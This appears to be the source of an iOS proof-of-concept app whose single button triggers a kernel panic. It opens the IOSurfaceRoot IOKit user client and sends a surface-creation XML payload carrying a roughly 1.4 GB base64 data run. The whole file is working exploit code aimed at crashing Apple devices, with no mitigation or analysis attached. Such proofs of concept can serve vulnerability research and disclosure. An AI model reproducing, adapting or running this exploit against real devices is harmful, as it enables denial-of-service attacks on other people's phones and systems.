//
//  ViewController.m
//  IOSurfaceRootXMLDataPanicPoC
//

#import "ViewController.h"

#import <CoreFoundation/CoreFoundation.h>
#import <dlfcn.h>
#import <mach/mach.h>
#import <mach/mach_error.h>
#import <stdint.h>
#import <stdlib.h>
#import <string.h>

typedef mach_port_t io_object_t;
typedef mach_port_t io_service_t;
typedef mach_port_t io_connect_t;

typedef CFMutableDictionaryRef (*IOServiceMatchingFn)(const char *name);
typedef io_service_t (*IOServiceGetMatchingServiceFn)(mach_port_t mainPort, CFDictionaryRef matching);
typedef kern_return_t (*IOServiceOpenFn)(io_service_t service, task_port_t owningTask, uint32_t type, io_connect_t *connect);
typedef kern_return_t (*IOConnectCallMethodFn)(io_connect_t connection,
                                              uint32_t selector,
                                              const uint64_t *input,
                                              uint32_t inputCnt,
                                              const void *inputStruct,
                                              size_t inputStructCnt,
                                              uint64_t *output,
                                              uint32_t *outputCnt,
                                              void *outputStruct,
                                              size_t *outputStructCnt);
typedef kern_return_t (*IOServiceCloseFn)(io_connect_t connect);
typedef kern_return_t (*IOObjectReleaseFn)(io_object_t object);

static const uint32_t kIOSurfaceRootUserClientType = 0;
static const uint32_t kIOSurfaceCreateSurfaceSelector = 0;
static const size_t kIOSurfaceBase64RunSize = (size_t)1408 * 1024 * 1024;

enum {
    kIOSurfaceCreateSurfaceOutputSize = 0xc68,
};

static const char kIOSurfaceXMLPrefix[] =
    "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
    "<dict>\n"
    "<key>IOSurfaceWidth</key><integer size=\"64\">1</integer>\n"
    "<key>IOSurfaceHeight</key><integer size=\"64\">1</integer>\n"
    "<key>IOSurfaceBytesPerElement</key><integer size=\"64\">4</integer>\n"
    "<key>IOSurfaceBytesPerRow</key><integer size=\"64\">4</integer>\n"
    "<key>IOSurfaceAllocSize</key><integer size=\"64\">4</integer>\n"
    "<key>IOSurfacePixelFormat</key><integer size=\"64\">0</integer>\n"
    "<key>IOSurfaceAddressRanges</key><data>\n";

static const char kIOSurfaceXMLSuffix[] =
    "\n</data>\n"
    "</dict>\n";

static void *CreateIOSurfacePanicPayload(size_t *payloadSize) {
    const size_t prefixSize = sizeof(kIOSurfaceXMLPrefix) - 1;
    const size_t suffixSize = sizeof(kIOSurfaceXMLSuffix) - 1;

    if (SIZE_MAX - prefixSize < kIOSurfaceBase64RunSize ||
        SIZE_MAX - prefixSize - kIOSurfaceBase64RunSize < suffixSize ||
        SIZE_MAX - prefixSize - kIOSurfaceBase64RunSize - suffixSize < 1) {
        return NULL;
    }

    const size_t totalSize = prefixSize + kIOSurfaceBase64RunSize + suffixSize + 1;
    char *payload = malloc(totalSize);
    if (!payload) {
        return NULL;
    }

    memcpy(payload, kIOSurfaceXMLPrefix, prefixSize);
    memset(payload + prefixSize, 'A', kIOSurfaceBase64RunSize);
    memcpy(payload + prefixSize + kIOSurfaceBase64RunSize, kIOSurfaceXMLSuffix, suffixSize);
    payload[totalSize - 1] = '\0';

    *payloadSize = totalSize;
    return payload;
}

@interface ViewController ()
@property (nonatomic, strong) UIButton *triggerButton;
@property (nonatomic, strong) UILabel *statusLabel;
@end

@implementation ViewController

- (void)viewDidLoad {
    [super viewDidLoad];

    self.view.backgroundColor = UIColor.systemBackgroundColor;

    self.triggerButton = [UIButton buttonWithType:UIButtonTypeSystem];
    self.triggerButton.translatesAutoresizingMaskIntoConstraints = NO;
    self.triggerButton.titleLabel.font = [UIFont systemFontOfSize:22.0 weight:UIFontWeightSemibold];
    [self.triggerButton setTitle:@"Trigger XML Data" forState:UIControlStateNormal];
    [self.triggerButton addTarget:self action:@selector(triggerPanic:) forControlEvents:UIControlEventTouchUpInside];

    self.statusLabel = [[UILabel alloc] initWithFrame:CGRectZero];
    self.statusLabel.translatesAutoresizingMaskIntoConstraints = NO;
    self.statusLabel.font = [UIFont systemFontOfSize:15.0];
    self.statusLabel.textColor = UIColor.secondaryLabelColor;
    self.statusLabel.numberOfLines = 0;
    self.statusLabel.textAlignment = NSTextAlignmentCenter;
    self.statusLabel.text = @"IOSurfaceRoot selector 0 XML data-growth probe";

    [self.view addSubview:self.triggerButton];
    [self.view addSubview:self.statusLabel];

    [NSLayoutConstraint activateConstraints:@[
        [self.triggerButton.centerXAnchor constraintEqualToAnchor:self.view.centerXAnchor],
        [self.triggerButton.centerYAnchor constraintEqualToAnchor:self.view.centerYAnchor],
        [self.triggerButton.widthAnchor constraintGreaterThanOrEqualToConstant:260.0],
        [self.triggerButton.heightAnchor constraintEqualToConstant:64.0],
        [self.statusLabel.topAnchor constraintEqualToAnchor:self.triggerButton.bottomAnchor constant:24.0],
        [self.statusLabel.leadingAnchor constraintEqualToAnchor:self.view.safeAreaLayoutGuide.leadingAnchor constant:24.0],
        [self.statusLabel.trailingAnchor constraintEqualToAnchor:self.view.safeAreaLayoutGuide.trailingAnchor constant:-24.0],
    ]];
}

- (void)triggerPanic:(UIButton *)sender {
    sender.enabled = NO;
    self.statusLabel.text = @"Building XML payload; watch the Xcode console and device panic log.";
    NSLog(@"IOSurfaceRoot panic probe: starting selector 0 with %llu-byte base64 data run",
          (unsigned long long)kIOSurfaceBase64RunSize);

    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
        [self runIOSurfaceRootXMLDataTrigger];

        dispatch_async(dispatch_get_main_queue(), ^{
            sender.enabled = YES;
        });
    });
}

- (void)setStatusText:(NSString *)text {
    dispatch_async(dispatch_get_main_queue(), ^{
        self.statusLabel.text = text;
    });
}

- (void)runIOSurfaceRootXMLDataTrigger {
    void *iokit = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_NOW);
    if (!iokit) {
        NSLog(@"IOSurfaceRoot panic probe: dlopen IOKit failed: %s", dlerror());
        [self setStatusText:@"IOKit symbol resolution failed."];
        return;
    }

    IOServiceMatchingFn IOServiceMatchingPtr = (IOServiceMatchingFn)dlsym(iokit, "IOServiceMatching");
    IOServiceGetMatchingServiceFn IOServiceGetMatchingServicePtr =
        (IOServiceGetMatchingServiceFn)dlsym(iokit, "IOServiceGetMatchingService");
    IOServiceOpenFn IOServiceOpenPtr = (IOServiceOpenFn)dlsym(iokit, "IOServiceOpen");
    IOConnectCallMethodFn IOConnectCallMethodPtr = (IOConnectCallMethodFn)dlsym(iokit, "IOConnectCallMethod");
    IOServiceCloseFn IOServiceClosePtr = (IOServiceCloseFn)dlsym(iokit, "IOServiceClose");
    IOObjectReleaseFn IOObjectReleasePtr = (IOObjectReleaseFn)dlsym(iokit, "IOObjectRelease");

    if (!IOServiceMatchingPtr || !IOServiceGetMatchingServicePtr || !IOServiceOpenPtr ||
        !IOConnectCallMethodPtr || !IOServiceClosePtr || !IOObjectReleasePtr) {
        NSLog(@"IOSurfaceRoot panic probe: required IOKit symbol missing");
        dlclose(iokit);
        [self setStatusText:@"IOKit symbol resolution failed."];
        return;
    }

    CFMutableDictionaryRef matching = IOServiceMatchingPtr("IOSurfaceRoot");
    if (!matching) {
        NSLog(@"IOSurfaceRoot panic probe: IOServiceMatching(IOSurfaceRoot) returned NULL");
        dlclose(iokit);
        [self setStatusText:@"IOSurfaceRoot matching failed."];
        return;
    }

    io_service_t service = IOServiceGetMatchingServicePtr(MACH_PORT_NULL, matching);
    if (!service) {
        NSLog(@"IOSurfaceRoot panic probe: IOSurfaceRoot service not found");
        dlclose(iokit);
        [self setStatusText:@"IOSurfaceRoot service not found."];
        return;
    }

    io_connect_t connection = MACH_PORT_NULL;
    kern_return_t kr = IOServiceOpenPtr(service,
                                        mach_task_self(),
                                        kIOSurfaceRootUserClientType,
                                        &connection);
    IOObjectReleasePtr(service);
    NSLog(@"IOSurfaceRoot panic probe: IOServiceOpen returned 0x%08x (%s)",
          kr,
          mach_error_string(kr));
    if (kr != KERN_SUCCESS) {
        dlclose(iokit);
        [self setStatusText:[NSString stringWithFormat:@"IOServiceOpen failed: 0x%08x", kr]];
        return;
    }

    size_t payloadSize = 0;
    void *payload = CreateIOSurfacePanicPayload(&payloadSize);
    if (!payload) {
        NSLog(@"IOSurfaceRoot panic probe: failed to allocate XML payload");
        IOServiceClosePtr(connection);
        dlclose(iokit);
        [self setStatusText:@"Local XML payload allocation failed."];
        return;
    }

    void *output = calloc(1, kIOSurfaceCreateSurfaceOutputSize);
    if (!output) {
        NSLog(@"IOSurfaceRoot panic probe: failed to allocate selector output");
        free(payload);
        IOServiceClosePtr(connection);
        dlclose(iokit);
        [self setStatusText:@"Local output allocation failed."];
        return;
    }

    uint64_t scalarInput[] = {0};
    size_t outputSize = kIOSurfaceCreateSurfaceOutputSize;
    NSLog(@"IOSurfaceRoot panic probe: selector %u create input=%zu bytes output=0x%x",
          kIOSurfaceCreateSurfaceSelector,
          payloadSize,
          kIOSurfaceCreateSurfaceOutputSize);
    kr = IOConnectCallMethodPtr(connection,
                                kIOSurfaceCreateSurfaceSelector,
                                scalarInput,
                                1,
                                payload,
                                payloadSize,
                                NULL,
                                NULL,
                                output,
                                &outputSize);
    NSLog(@"IOSurfaceRoot panic probe: IOConnectCallMethod selector %u returned 0x%08x (%s), outputSize=%zu",
          kIOSurfaceCreateSurfaceSelector,
          kr,
          mach_error_string(kr),
          outputSize);

    free(output);
    free(payload);
    IOServiceClosePtr(connection);
    dlclose(iokit);
    [self setStatusText:[NSString stringWithFormat:@"Call returned 0x%08x; check console/panic logs.", kr]];
}

@end
